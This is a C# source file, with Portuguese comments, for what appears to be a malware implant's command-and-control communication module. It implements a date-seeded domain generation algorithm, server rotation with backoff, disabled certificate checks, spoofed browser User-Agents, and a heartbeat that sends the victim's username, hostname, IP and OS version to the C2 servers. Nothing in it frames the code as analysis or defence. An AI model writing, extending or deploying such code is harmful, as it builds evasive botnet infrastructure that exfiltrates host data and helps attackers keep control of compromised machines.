using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Web.Script.Serialization;

namespace XYZ.modules
{
    /// <summary>
    /// Sistema de comunicação resiliente com C2
    /// Implementa retry exponencial, Domain Generation Algorithm (DGA), 
    /// criptografia ponta-a-ponta e rotação de servidores
    /// </summary>
    public static class ResilientC2Communication
    {
        private static HttpClient httpClient;
        public static List<string> c2Servers = new List<string>(); // public para debug se necessario
        private static int currentServerIndex = 0;
        private static int consecutiveFailures = 0;
        private static readonly object serverLock = new object();
        private static DateTime lastDGAGeneration = DateTime.MinValue;
        
        // Configurações
        private const int MAX_RETRIES = 5;
        private const int BASE_DELAY_MS = 1000;
        private const int MAX_CONSECUTIVE_FAILURES = 10;
        private const int REQUEST_TIMEOUT_SECONDS = 30;

        static ResilientC2Communication()
        {
            InitializeHttpClient();
            RegenerateDomains();
        }

        public static string GetBaseUrl()
        {
            return GetCurrentServer();
        }

        public static async Task<string> SendData(string endpoint, object data)
        {
            var serializer = new JavaScriptSerializer();
            string json = serializer.Serialize(data);
            return await PostData(endpoint, json);
        }

        private static void InitializeHttpClient()
        {
            try
            {
                var handler = new HttpClientHandler
                {
                    AllowAutoRedirect = true,
                    MaxAutomaticRedirections = 5,
                    UseCookies = false,
                    ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
                };

                httpClient = new HttpClient(handler)
                {
                    Timeout = TimeSpan.FromSeconds(REQUEST_TIMEOUT_SECONDS)
                };

                string[] userAgents = {
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0"
                };

                Random rnd = new Random();
                httpClient.DefaultRequestHeaders.Add("User-Agent", userAgents[rnd.Next(userAgents.Length)]);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("C2Communication.Init", ex);
            }
        }

        private static void RegenerateDomains()
        {
            lock (serverLock)
            {
                try
                {
                    // Prioriza o servidor C2 principal
                    c2Servers = new List<string> { "http://127.0.0.1:8000" };
                    c2Servers.AddRange(DomainGenerationAlgorithm.GenerateDomains(DateTime.UtcNow));
                    c2Servers.AddRange(GetFallbackDomains());
                    // Remove duplicatas mantendo a ordem (principal primeiro)
                    c2Servers = c2Servers.Distinct().ToList();
                    
                    currentServerIndex = 0;
                    lastDGAGeneration = DateTime.UtcNow;
                    
                    SecureLogger.LogInfo("C2Communication", string.Format("Generated {0} C2 domains", c2Servers.Count));
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("C2Communication.DGA", ex);
                }
            }
        }

        private static List<string> GetFallbackDomains()
        {
            return new List<string>
            {
                "http://localhost/c2", 
                "http://127.0.0.1/c2"
            };
        }

        public static async Task<HttpResponseMessage> SendWithRetry(
            string endpoint, 
            HttpMethod method, 
            string content = null,
            Dictionary<string, string> headers = null,
            int maxRetries = MAX_RETRIES)
        {
            int attempt = 0;
            Exception lastException = null;

            while (attempt < maxRetries)
            {
                try
                {
                    string currentServer = GetCurrentServer();
                    string fullUrl = string.Format("{0}/{1}", currentServer, endpoint);

                    SecureLogger.LogDebug("C2Communication", string.Format("Attempt {0}/{1} to {2}", attempt + 1, maxRetries, fullUrl));

                    HttpRequestMessage request = new HttpRequestMessage(method, fullUrl);

                    if (!string.IsNullOrEmpty(content))
                    {
                        request.Content = new StringContent(content, Encoding.UTF8, "application/json");
                    }

                    if (headers != null)
                    {
                        foreach (var header in headers)
                        {
                            request.Headers.Add(header.Key, header.Value);
                        }
                    }

                    string signature = SecurityUtilities.GenerateHMAC(content ?? "");
                    request.Headers.Add("X-Signature", signature);
                    request.Headers.Add("X-Timestamp", DateTime.UtcNow.ToString("o"));
                    request.Headers.Add("X-Terminal-ID", Program.GetTerminalId());

                    HttpResponseMessage response = await httpClient.SendAsync(request);

                    if (response.IsSuccessStatusCode)
                    {
                        consecutiveFailures = 0;
                        SecureLogger.LogInfo("C2Communication", string.Format("Successfully communicated with {0}", currentServer));
                        return response;
                    }
                    else
                    {
                        SecureLogger.LogWarning("C2Communication", 
                            string.Format("Server returned {0}", response.StatusCode),
                            new Dictionary<string, object> { { "StatusCode", response.StatusCode } });
                        
                        RotateToNextServer();
                    }
                }
                catch (Exception ex)
                {
                    lastException = ex;
                    SecureLogger.LogError("C2Communication", ex);
                    RotateToNextServer();
                }

                consecutiveFailures++;

                if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES)
                {
                    SecureLogger.LogWarning("C2Communication", 
                        string.Format("Too many consecutive failures ({0}), regenerating domains", consecutiveFailures));
                    RegenerateDomains();
                    consecutiveFailures = 0;
                }

                int delay = CalculateBackoffDelay(attempt);
                await Task.Delay(delay);

                attempt++;
            }

            throw new Exception(string.Format("Failed to communicate with C2 after {0} attempts", maxRetries), lastException);
        }

        private static int CalculateBackoffDelay(int attempt)
        {
            int exponentialDelay = BASE_DELAY_MS * (int)Math.Pow(2, attempt);
            exponentialDelay = Math.Min(exponentialDelay, 60000);
            Random rnd = new Random();
            int jitter = rnd.Next(-exponentialDelay / 4, exponentialDelay / 4);
            return exponentialDelay + jitter;
        }

        private static string GetCurrentServer()
        {
            lock (serverLock)
            {
                if (c2Servers == null || c2Servers.Count == 0)
                {
                    RegenerateDomains();
                }
                return c2Servers[currentServerIndex];
            }
        }

        private static void RotateToNextServer()
        {
            lock (serverLock)
            {
                currentServerIndex = (currentServerIndex + 1) % c2Servers.Count;
                if (currentServerIndex == 0)
                {
                    if ((DateTime.UtcNow - lastDGAGeneration).TotalHours >= 24)
                    {
                        RegenerateDomains();
                    }
                }
            }
        }

        public static async Task<string> PostData(string endpoint, string jsonData)
        {
            try
            {
                HttpResponseMessage response = await SendWithRetry(endpoint, HttpMethod.Post, jsonData);
                return await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("C2Communication.Post", ex);
                throw;
            }
        }

        public static async Task<string> GetData(string endpoint)
        {
            try
            {
                HttpResponseMessage response = await SendWithRetry(endpoint, HttpMethod.Get);
                return await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("C2Communication.Get", ex);
                throw;
            }
        }

        public static async Task SendHeartbeat()
        {
            try
            {
                var heartbeatData = new
                {
                    id = Program.GetTerminalId(),
                    status = "online",
                    timestamp = DateTime.UtcNow,
                    uptime_seconds = (int)Program.GetUptime().TotalSeconds,
                    version = "5.0.0",
                    os = Program.GetOSVersion(),
                    username = Environment.UserName,
                    hostname = Environment.MachineName,
                    ip = Program.GetLocalIPAddress()
                };

                string json = new JavaScriptSerializer().Serialize(heartbeatData);
                await PostData("api/status", json); // Ajustado rota para v5 api/status
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("C2Communication.Heartbeat", ex);
            }
        }

        public static void ForceRegenerateDomains()
        {
            RegenerateDomains();
        }
    }

    public static class DomainGenerationAlgorithm
    {
        private const int DOMAINS_PER_DAY = 10;
        private static readonly string[] TLDs = { ".com", ".net", ".org" };

        public static List<string> GenerateDomains(DateTime date)
        {
            List<string> domains = new List<string>();
            try
            {
                int seed = date.Year * 10000 + date.Month * 100 + date.Day;
                Random rnd = new Random(seed);

                for (int i = 0; i < DOMAINS_PER_DAY; i++)
                {
                    string domain = GenerateSingleDomain(rnd);
                    string tld = TLDs[rnd.Next(TLDs.Length)];
                    string fullDomain = string.Format("https://{0}{1}", domain, tld);
                    domains.Add(fullDomain);
                }
                SecureLogger.LogDebug("DGA", string.Format("Generated {0} domains", domains.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("DGA", ex);
            }
            return domains;
        }

        private static string GenerateSingleDomain(Random rnd)
        {
            int length = rnd.Next(8, 16);
            StringBuilder domain = new StringBuilder();
            domain.Append((char)('a' + rnd.Next(26)));
            for (int i = 1; i < length; i++)
            {
                if (rnd.Next(100) < 80) domain.Append((char)('a' + rnd.Next(26)));
                else domain.Append((char)('0' + rnd.Next(10)));
            }
            return domain.ToString();
        }
    }
}
